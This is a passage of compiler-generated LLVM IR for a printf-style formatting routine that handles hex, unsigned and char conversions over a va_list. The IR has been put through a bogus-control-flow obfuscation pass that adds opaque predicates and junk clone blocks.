  br i1 %298, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %290
  %299 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %278, i32 0, i32 3
  %300 = load i8*, i8** %299, align 8
  %301 = getelementptr i8, i8* %300, i32 %280
  %302 = bitcast i8* %301 to i32*
  %303 = add i32 %280, 8
  store i32 %303, i32* %279, align 8
  %304 = load i32, i32* @x.13
  %305 = load i32, i32* @y.14
  %306 = sub i32 %304, 1
  %307 = mul i32 %304, %306
  %308 = urem i32 %307, 2
  %309 = icmp eq i32 %308, 0
  %310 = icmp slt i32 %305, 10
  %311 = or i1 %309, %310
  br i1 %311, label %originalBBpart289, label %originalBB82alteredBB

originalBBpart289:                                ; preds = %originalBB82
  br label %317

; <label>:312:                                    ; preds = %originalBBpart280
  %313 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %278, i32 0, i32 2
  %314 = load i8*, i8** %313, align 8
  %315 = bitcast i8* %314 to i32*
  %316 = getelementptr i8, i8* %314, i32 8
  store i8* %316, i8** %313, align 8
  br label %317

; <label>:317:                                    ; preds = %312, %originalBBpart289
  %318 = phi i32* [ %302, %originalBBpart289 ], [ %315, %312 ]
  %319 = load i32, i32* %318, align 4
  %320 = load i32, i32* %7, align 4
  %321 = load i32, i32* %8, align 4
  %322 = call i32 @printi(i8** %277, i32 %319, i32 10, i32 1, i32 %320, i32 %321, i32 97)
  %323 = load i32, i32* %9, align 4
  %324 = add nsw i32 %323, %322
  store i32 %324, i32* %9, align 4
  br label %651

; <label>:325:                                    ; preds = %originalBBpart276
  %326 = load i8*, i8** %5, align 8
  %327 = load i8, i8* %326, align 1
  %328 = zext i8 %327 to i32
  %329 = icmp eq i32 %328, 120
  br i1 %329, label %330, label %387

; <label>:330:                                    ; preds = %325
  %331 = load i32, i32* @x.13
  %332 = load i32, i32* @y.14
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %330
  %339 = load i8**, i8*** %4, align 8
  %340 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %341 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %340, i32 0, i32 0
  %342 = load i32, i32* %341, align 8
  %343 = icmp ule i32 %342, 40
  %344 = load i32, i32* @x.13
  %345 = load i32, i32* @y.14
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br i1 %343, label %352, label %358

; <label>:352:                                    ; preds = %originalBBpart293
  %353 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %340, i32 0, i32 3
  %354 = load i8*, i8** %353, align 8
  %355 = getelementptr i8, i8* %354, i32 %342
  %356 = bitcast i8* %355 to i32*
  %357 = add i32 %342, 8
  store i32 %357, i32* %341, align 8
  br label %363

; <label>:358:                                    ; preds = %originalBBpart293
  %359 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %340, i32 0, i32 2
  %360 = load i8*, i8** %359, align 8
  %361 = bitcast i8* %360 to i32*
  %362 = getelementptr i8, i8* %360, i32 8
  store i8* %362, i8** %359, align 8
  br label %363

; <label>:363:                                    ; preds = %358, %352
  %364 = phi i32* [ %356, %352 ], [ %361, %358 ]
  %365 = load i32, i32* @x.13
  %366 = load i32, i32* @y.14
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %363
  %373 = load i32, i32* %364, align 4
  %374 = load i32, i32* %7, align 4
  %375 = load i32, i32* %8, align 4
  %376 = call i32 @printi(i8** %339, i32 %373, i32 16, i32 0, i32 %374, i32 %375, i32 97)
  %377 = load i32, i32* %9, align 4
  %378 = add nsw i32 %377, %376
  store i32 %378, i32* %9, align 4
  %379 = load i32, i32* @x.13
  %380 = load i32, i32* @y.14
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart298, label %originalBB95alteredBB

originalBBpart298:                                ; preds = %originalBB95
  br label %651

; <label>:387:                                    ; preds = %325
  %388 = load i8*, i8** %5, align 8
  %389 = load i8, i8* %388, align 1
  %390 = zext i8 %389 to i32
  %391 = icmp eq i32 %390, 88
  br i1 %391, label %392, label %449

; <label>:392:                                    ; preds = %387
  %393 = load i32, i32* @x.13
  %394 = load i32, i32* @y.14
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %392
  %401 = load i8**, i8*** %4, align 8
  %402 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %403 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %402, i32 0, i32 0
  %404 = load i32, i32* %403, align 8
  %405 = icmp ule i32 %404, 40
  %406 = load i32, i32* @x.13
  %407 = load i32, i32* @y.14
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br i1 %405, label %414, label %420

; <label>:414:                                    ; preds = %originalBBpart2102
  %415 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %402, i32 0, i32 3
  %416 = load i8*, i8** %415, align 8
  %417 = getelementptr i8, i8* %416, i32 %404
  %418 = bitcast i8* %417 to i32*
  %419 = add i32 %404, 8
  store i32 %419, i32* %403, align 8
  br label %441

; <label>:420:                                    ; preds = %originalBBpart2102
  %421 = load i32, i32* @x.13
  %422 = load i32, i32* @y.14
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %420
  %429 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %402, i32 0, i32 2
  %430 = load i8*, i8** %429, align 8
  %431 = bitcast i8* %430 to i32*
  %432 = getelementptr i8, i8* %430, i32 8
  store i8* %432, i8** %429, align 8
  %433 = load i32, i32* @x.13
  %434 = load i32, i32* @y.14
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %441

; <label>:441:                                    ; preds = %originalBBpart2106, %414
  %442 = phi i32* [ %418, %414 ], [ %431, %originalBBpart2106 ]
  %443 = load i32, i32* %442, align 4
  %444 = load i32, i32* %7, align 4
  %445 = load i32, i32* %8, align 4
  %446 = call i32 @printi(i8** %401, i32 %443, i32 16, i32 0, i32 %444, i32 %445, i32 65)
  %447 = load i32, i32* %9, align 4
  %448 = add nsw i32 %447, %446
  store i32 %448, i32* %9, align 4
  br label %651

; <label>:449:                                    ; preds = %387
  %450 = load i8*, i8** %5, align 8
  %451 = load i8, i8* %450, align 1
  %452 = zext i8 %451 to i32
  %453 = icmp eq i32 %452, 117
  br i1 %453, label %454, label %511

; <label>:454:                                    ; preds = %449
  %455 = load i8**, i8*** %4, align 8
  %456 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %457 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %456, i32 0, i32 0
  %458 = load i32, i32* %457, align 8
  %459 = icmp ule i32 %458, 40
  br i1 %459, label %460, label %482

; <label>:460:                                    ; preds = %454
  %461 = load i32, i32* @x.13
  %462 = load i32, i32* @y.14
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %460
  %469 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %456, i32 0, i32 3
  %470 = load i8*, i8** %469, align 8
  %471 = getelementptr i8, i8* %470, i32 %458
  %472 = bitcast i8* %471 to i32*
  %473 = add i32 %458, 8
  store i32 %473, i32* %457, align 8
  %474 = load i32, i32* @x.13
  %475 = load i32, i32* @y.14
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBBpart2120, label %originalBB108alteredBB

originalBBpart2120:                               ; preds = %originalBB108
  br label %503

; <label>:482:                                    ; preds = %454
  %483 = load i32, i32* @x.13
  %484 = load i32, i32* @y.14
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %482
  %491 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %456, i32 0, i32 2
  %492 = load i8*, i8** %491, align 8
  %493 = bitcast i8* %492 to i32*
  %494 = getelementptr i8, i8* %492, i32 8
  store i8* %494, i8** %491, align 8
  %495 = load i32, i32* @x.13
  %496 = load i32, i32* @y.14
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %503

; <label>:503:                                    ; preds = %originalBBpart2124, %originalBBpart2120
  %504 = phi i32* [ %472, %originalBBpart2120 ], [ %493, %originalBBpart2124 ]
  %505 = load i32, i32* %504, align 4
  %506 = load i32, i32* %7, align 4
  %507 = load i32, i32* %8, align 4
  %508 = call i32 @printi(i8** %455, i32 %505, i32 10, i32 0, i32 %506, i32 %507, i32 97)
  %509 = load i32, i32* %9, align 4
  %510 = add nsw i32 %509, %508
  store i32 %510, i32* %9, align 4
  br label %651

; <label>:511:                                    ; preds = %449
  %512 = load i32, i32* @x.13
  %513 = load i32, i32* @y.14
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %511
  %520 = load i8*, i8** %5, align 8
  %521 = load i8, i8* %520, align 1
  %522 = zext i8 %521 to i32
  %523 = icmp eq i32 %522, 99
  %524 = load i32, i32* @x.13
  %525 = load i32, i32* @y.14
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %523, label %532, label %593

; <label>:532:                                    ; preds = %originalBBpart2128
  %533 = load i32, i32* @x.13
  %534 = load i32, i32* @y.14
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %532
  %541 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %542 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %541, i32 0, i32 0
  %543 = load i32, i32* %542, align 8
  %544 = icmp ule i32 %543, 40
  %545 = load i32, i32* @x.13
  %546 = load i32, i32* @y.14
  %547 = sub i32 %545, 1
  %548 = mul i32 %545, %547
  %549 = urem i32 %548, 2
  %550 = icmp eq i32 %549, 0
  %551 = icmp slt i32 %546, 10
  %552 = or i1 %550, %551
  br i1 %552, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %544, label %553, label %559

; <label>:553:                                    ; preds = %originalBBpart2132
  %554 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %541, i32 0, i32 3
  %555 = load i8*, i8** %554, align 8
  %556 = getelementptr i8, i8* %555, i32 %543
  %557 = bitcast i8* %556 to i32*
  %558 = add i32 %543, 8
  store i32 %558, i32* %542, align 8
  br label %580

; <label>:559:                                    ; preds = %originalBBpart2132
  %560 = load i32, i32* @x.13
  %561 = load i32, i32* @y.14
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
  br i1 %567, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %559
  %568 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %541, i32 0, i32 2
  %569 = load i8*, i8** %568, align 8
  %570 = bitcast i8* %569 to i32*
  %571 = getelementptr i8, i8* %569, i32 8
  store i8* %571, i8** %568, align 8
  %572 = load i32, i32* @x.13
  %573 = load i32, i32* @y.14
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %580

; <label>:580:                                    ; preds = %originalBBpart2136, %553
  %581 = phi i32* [ %557, %553 ], [ %570, %originalBBpart2136 ]
  %582 = load i32, i32* %581, align 4
  %583 = trunc i32 %582 to i8
  %584 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %583, i8* %584, align 1
  %585 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %585, align 1
  %586 = load i8**, i8*** %4, align 8
  %587 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %588 = load i32, i32* %7, align 4
  %589 = load i32, i32* %8, align 4
  %590 = call i32 @prints(i8** %586, i8* %587, i32 %588, i32 %589)
  %591 = load i32, i32* %9, align 4
  %592 = add nsw i32 %591, %590
  store i32 %592, i32* %9, align 4
  br label %651

; <label>:593:                                    ; preds = %originalBBpart2128
  br label %634

; <label>:594:                                    ; preds = %originalBBpart2
  %595 = load i32, i32* @x.13
  %596 = load i32, i32* @y.14
  %597 = sub i32 %595, 1
  %598 = mul i32 %595, %597
  %599 = urem i32 %598, 2
  %600 = icmp eq i32 %599, 0
  %601 = icmp slt i32 %596, 10
  %602 = or i1 %600, %601
  br i1 %602, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %594
  %603 = load i32, i32* @x.13
  %604 = load i32, i32* @y.14
  %605 = sub i32 %603, 1
  %606 = mul i32 %603, %605
  %607 = urem i32 %606, 2
  %608 = icmp eq i32 %607, 0
  %609 = icmp slt i32 %604, 10
  %610 = or i1 %608, %609
  br i1 %610, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %611

; <label>:611:                                    ; preds = %originalBBpart2140, %51
  %612 = load i32, i32* @x.13
  %613 = load i32, i32* @y.14
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %611
  %620 = load i8**, i8*** %4, align 8
  %621 = load i8*, i8** %5, align 8
  %622 = load i8, i8* %621, align 1
  %623 = zext i8 %622 to i32
  call void @printchar(i8** %620, i32 %623)
  %624 = load i32, i32* %9, align 4
  %625 = add nsw i32 %624, 1
  store i32 %625, i32* %9, align 4
  %626 = load i32, i32* @x.13
  %627 = load i32, i32* @y.14
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBBpart2145, label %originalBB142alteredBB

originalBBpart2145:                               ; preds = %originalBB142
  br label %634

; <label>:634:                                    ; preds = %originalBBpart2145, %593
  %635 = load i32, i32* @x.13
  %636 = load i32, i32* @y.14
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBB147, label %originalBB147alteredBB

originalBB147:                                    ; preds = %originalBB147alteredBB, %634
  %643 = load i32, i32* @x.13
  %644 = load i32, i32* @y.14
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
  br i1 %650, label %originalBBpart2149, label %originalBB147alteredBB

originalBBpart2149:                               ; preds = %originalBB147
  br label %651

; <label>:651:                                    ; preds = %originalBBpart2149, %580, %503, %441, %originalBBpart298, %317, %240
  %652 = load i32, i32* @x.13
  %653 = load i32, i32* @y.14
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBB151, label %originalBB151alteredBB

originalBB151:                                    ; preds = %originalBB151alteredBB, %651
  %660 = load i8*, i8** %5, align 8
  %661 = getelementptr inbounds i8, i8* %660, i32 1
  store i8* %661, i8** %5, align 8
  %662 = load i32, i32* @x.13
  %663 = load i32, i32* @y.14
  %664 = sub i32 %662, 1
  %665 = mul i32 %662, %664
  %666 = urem i32 %665, 2
  %667 = icmp eq i32 %666, 0
  %668 = icmp slt i32 %663, 10
  %669 = or i1 %667, %668
  br i1 %669, label %originalBBpart2153, label %originalBB151alteredBB

originalBBpart2153:                               ; preds = %originalBB151
  br label %12

; <label>:670:                                    ; preds = %45, %12
  %671 = load i8**, i8*** %4, align 8
  %672 = icmp ne i8** %671, null
  br i1 %672, label %673, label %692

; <label>:673:                                    ; preds = %670
  %674 = load i32, i32* @x.13
  %675 = load i32, i32* @y.14
  %676 = sub i32 %674, 1
  %677 = mul i32 %674, %676
  %678 = urem i32 %677, 2
  %679 = icmp eq i32 %678, 0
  %680 = icmp slt i32 %675, 10
  %681 = or i1 %679, %680
  br i1 %681, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %673
  %682 = load i8**, i8*** %4, align 8
  %683 = load i8*, i8** %682, align 8
  store i8 0, i8* %683, align 1
  %684 = load i32, i32* @x.13
  %685 = load i32, i32* @y.14
  %686 = sub i32 %684, 1
  %687 = mul i32 %684, %686
  %688 = urem i32 %687, 2
  %689 = icmp eq i32 %688, 0
  %690 = icmp slt i32 %685, 10
  %691 = or i1 %689, %690
  br i1 %691, label %originalBBpart2157, label %originalBB155alteredBB

originalBBpart2157:                               ; preds = %originalBB155
  br label %692

; <label>:692:                                    ; preds = %originalBBpart2157, %670
  %693 = load i32, i32* @x.13
  %694 = load i32, i32* @y.14
  %695 = sub i32 %693, 1
  %696 = mul i32 %693, %695
  %697 = urem i32 %696, 2
  %698 = icmp eq i32 %697, 0
  %699 = icmp slt i32 %694, 10
  %700 = or i1 %698, %699
  br i1 %700, label %originalBB159, label %originalBB159alteredBB

originalBB159:                                    ; preds = %originalBB159alteredBB, %692
  %701 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %702 = bitcast %struct.__va_list_tag* %701 to i8*
  call void @llvm.va_end(i8* %702)
  %703 = load i32, i32* %9, align 4
  %704 = load i32, i32* @x.13
  %705 = load i32, i32* @y.14
  %706 = sub i32 %704, 1
  %707 = mul i32 %704, %706
  %708 = urem i32 %707, 2
  %709 = icmp eq i32 %708, 0
  %710 = icmp slt i32 %705, 10
  %711 = or i1 %709, %710
  br i1 %711, label %originalBBpart2161, label %originalBB159alteredBB

originalBBpart2161:                               ; preds = %originalBB159
  ret i32 %703

originalBBalteredBB:                              ; preds = %originalBB, %17
  %712 = load i8*, i8** %5, align 8
  %713 = load i8, i8* %712, align 1
  %714 = zext i8 %713 to i32
  %715 = icmp eq i32 %714, 37
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %66
  %716 = load i8*, i8** %5, align 8
  %717 = getelementptr inbounds i8, i8* %716, i32 1
  store i8* %717, i8** %5, align 8
  %718 = load i32, i32* %8, align 4
  %_ = shl i32 %718, 2
  %_2 = sub i32 0, %718
  %gen = add i32 %_2, 2
  %_3 = sub i32 %718, 2
  %gen4 = mul i32 %_3, 2
  %_5 = sub i32 %718, 2
  %gen6 = mul i32 %_5, 2
  %_7 = sub i32 %718, 2
  %gen8 = mul i32 %_7, 2
  %_9 = sub i32 0, %718
  %gen10 = add i32 %_9, 2
  %_11 = shl i32 %718, 2
  %719 = or i32 %718, 2
  store i32 %719, i32* %8, align 4
  br label %originalBB1

originalBB15alteredBB:                            ; preds = %originalBB15, %93
  %720 = load i8*, i8** %5, align 8
  %721 = load i8, i8* %720, align 1
  %722 = zext i8 %721 to i32
  %723 = icmp sle i32 %722, 57
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %116
  %724 = load i32, i32* %7, align 4
  %_20 = sub i32 %724, 10
  %gen21 = mul i32 %_20, 10
  %_22 = sub i32 %724, 10
  %gen23 = mul i32 %_22, 10
  %_24 = sub i32 0, %724
  %gen25 = add i32 %_24, 10
  %_26 = sub i32 %724, 10
  %gen27 = mul i32 %_26, 10
  %_28 = sub i32 0, %724
  %gen29 = add i32 %_28, 10
  %_30 = sub i32 0, %724
  %gen31 = add i32 %_30, 10
  %_32 = sub i32 0, %724
  %gen33 = add i32 %_32, 10
  %_34 = shl i32 %724, 10
  %725 = mul nsw i32 %724, 10
  store i32 %725, i32* %7, align 4
  %726 = load i8*, i8** %5, align 8
  %727 = load i8, i8* %726, align 1
  %728 = zext i8 %727 to i32
  %_35 = sub i32 0, %728
  %gen36 = add i32 %_35, 48
  %_37 = sub i32 %728, 48
  %gen38 = mul i32 %_37, 48
  %_39 = sub i32 0, %728
  %gen40 = add i32 %_39, 48
  %_41 = sub i32 %728, 48
  %gen42 = mul i32 %_41, 48
  %_43 = shl i32 %728, 48
  %729 = sub nsw i32 %728, 48
  %730 = load i32, i32* %7, align 4
  %_44 = sub i32 0, %730
  %gen45 = add i32 %_44, %729
  %_46 = shl i32 %730, %729
  %_47 = shl i32 %730, %729
  %_48 = sub i32 0, %730
  %gen49 = add i32 %_48, %729
  %_50 = shl i32 %730, %729
  %_51 = sub i32 %730, %729
  %gen52 = mul i32 %_51, %729
  %_53 = sub i32 0, %730
  %gen54 = add i32 %_53, %729
  %731 = add nsw i32 %730, %729
  store i32 %731, i32* %7, align 4
  br label %originalBB19

originalBB58alteredBB:                            ; preds = %originalBB58, %141
  %732 = load i8*, i8** %5, align 8
  %733 = getelementptr inbounds i8, i8* %732, i32 1
  store i8* %733, i8** %5, align 8
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %160
  %734 = load i8*, i8** %5, align 8
  %735 = load i8, i8* %734, align 1
  %736 = zext i8 %735 to i32
  %737 = icmp eq i32 %736, 115
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %197
  %738 = load i32, i32* %198, align 4
  %739 = sext i32 %738 to i64
  %740 = inttoptr i64 %739 to i8*
  store i8* %740, i8** %11, align 8
  %741 = load i8**, i8*** %4, align 8
  %742 = load i8*, i8** %11, align 8
  %743 = icmp ne i8* %742, null
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %221
  %744 = load i8*, i8** %11, align 8
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %247
  %745 = load i8*, i8** %5, align 8
  %746 = load i8, i8* %745, align 1
  %747 = zext i8 %746 to i32
  %748 = icmp eq i32 %747, 100
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %268
  %749 = load i8**, i8*** %4, align 8
  %750 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %751 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %750, i32 0, i32 0
  %752 = load i32, i32* %751, align 8
  %753 = icmp ule i32 %752, 40
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %290
  %754 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %278, i32 0, i32 3
  %755 = load i8*, i8** %754, align 8
  %756 = getelementptr i8, i8* %755, i32 %280
  %757 = bitcast i8* %756 to i32*
  %_83 = sub i32 0, %280
  %gen84 = add i32 %_83, 8
  %_85 = shl i32 %280, 8
  %_86 = sub i32 0, %280
  %gen87 = add i32 %_86, 8
  %758 = add i32 %280, 8
  store i32 %758, i32* %279, align 8
  br label %originalBB82

originalBB91alteredBB:                            ; preds = %originalBB91, %330
  %759 = load i8**, i8*** %4, align 8
  %760 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %761 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %760, i32 0, i32 0
  %762 = load i32, i32* %761, align 8
  %763 = icmp ule i32 %762, 40
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %363
  %764 = load i32, i32* %364, align 4
  %765 = load i32, i32* %7, align 4
  %766 = load i32, i32* %8, align 4
  %767 = call i32 @printi(i8** %339, i32 %764, i32 16, i32 0, i32 %765, i32 %766, i32 97)
  %768 = load i32, i32* %9, align 4
  %_96 = shl i32 %768, %767
  %769 = add nsw i32 %768, %767
  store i32 %769, i32* %9, align 4
  br label %originalBB95

originalBB100alteredBB:                           ; preds = %originalBB100, %392
  %770 = load i8**, i8*** %4, align 8
  %771 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %772 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %771, i32 0, i32 0
  %773 = load i32, i32* %772, align 8
  %774 = icmp ule i32 %773, 40
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %420
  %775 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %402, i32 0, i32 2
  %776 = load i8*, i8** %775, align 8
  %777 = bitcast i8* %776 to i32*
  %778 = getelementptr i8, i8* %776, i32 8
  store i8* %778, i8** %775, align 8
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %460
  %779 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %456, i32 0, i32 3
  %780 = load i8*, i8** %779, align 8
  %781 = getelementptr i8, i8* %780, i32 %458
  %782 = bitcast i8* %781 to i32*
  %_109 = sub i32 0, %458
  %gen110 = add i32 %_109, 8
  %_111 = sub i32 0, %458
  %gen112 = add i32 %_111, 8
  %_113 = shl i32 %458, 8
  %_114 = sub i32 0, %458
  %gen115 = add i32 %_114, 8
  %_116 = shl i32 %458, 8
  %_117 = sub i32 0, %458
  %gen118 = add i32 %_117, 8
  %783 = add i32 %458, 8
  store i32 %783, i32* %457, align 8
  br label %originalBB108

originalBB122alteredBB:                           ; preds = %originalBB122, %482
  %784 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %456, i32 0, i32 2
  %785 = load i8*, i8** %784, align 8
  %786 = bitcast i8* %785 to i32*
  %787 = getelementptr i8, i8* %785, i32 8
  store i8* %787, i8** %784, align 8
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %511
  %788 = load i8*, i8** %5, align 8
  %789 = load i8, i8* %788, align 1
  %790 = zext i8 %789 to i32
  %791 = icmp eq i32 %790, 99
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %532
  %792 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %793 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %792, i32 0, i32 0
  %794 = load i32, i32* %793, align 8
  %795 = icmp ule i32 %794, 40
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %559
  %796 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %541, i32 0, i32 2
  %797 = load i8*, i8** %796, align 8
